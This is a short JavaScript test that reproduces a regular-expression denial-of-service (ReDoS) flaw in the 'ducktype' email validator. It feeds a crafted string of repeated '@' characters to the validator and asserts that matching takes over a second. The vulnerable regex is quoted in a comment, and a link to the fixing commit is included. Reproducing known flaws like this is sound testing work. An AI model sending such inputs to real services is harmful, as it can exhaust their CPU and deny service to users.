
//https://github.com/josdejong/ducktype/commit/d8b4c902598c9104d5c56225c3fffcbe1368eff6
test("ReDos in ducktype", () => {
    const { genstr } = require("./utils");
    const measureTime = require("./utils").measureTime;
    const ducktype = require('ducktype');
    var type = ducktype.email;
    
    let attack_str = 's' +  genstr(60000000,'@@@@@@@@@@') + "-"
    let t = measureTime(function () {
        type.test(attack_str);
    });
  
    let time = t[0] + t[1] / 1000000000;
  
    expect(time).toBeGreaterThan(1);
  });
  // var emailRegExp = /^[a-zA-Z][\w\.-]*[a-zA-Z0-9]@[a-zA-Z0-9][\w\.-]*[a-zA-Z0-9]\.[a-zA-Z][a-zA-Z\.]*[a-zA-Z]$/;